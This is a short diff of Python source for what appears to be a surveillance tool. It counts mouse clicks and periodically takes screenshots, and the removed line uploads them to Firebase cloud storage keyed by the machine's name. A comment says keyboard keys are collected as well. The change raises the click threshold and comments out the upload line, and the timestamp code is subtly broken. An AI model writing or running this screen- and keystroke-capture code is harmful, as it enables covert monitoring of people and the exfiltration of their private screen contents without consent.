@@ -108,7 +108,7 @@ def on_click(x, y, button, pressed):
     global clicks_counter, full_currentTime, today_date
 
     clicks_counter += 1
-    if clicks_counter == 10:
+    if clicks_counter == 40:
         # take screenshot and upload to firebase storage
         clicks_counter = 0
 
@@ -121,9 +121,9 @@ def on_click(x, y, button, pressed):
             full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
             today_date = full_currentTime.split(' ')[1]
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            '''storage.child(os.environ['COMPUTERNAME'] +
                           '/screenshot_' + full_currentTime + '.jpg') \
-                .put('screenshot.jpg')
+                .put(imgPath)'''
 
 
 # Collect events of mouse clicks and keyboard keys
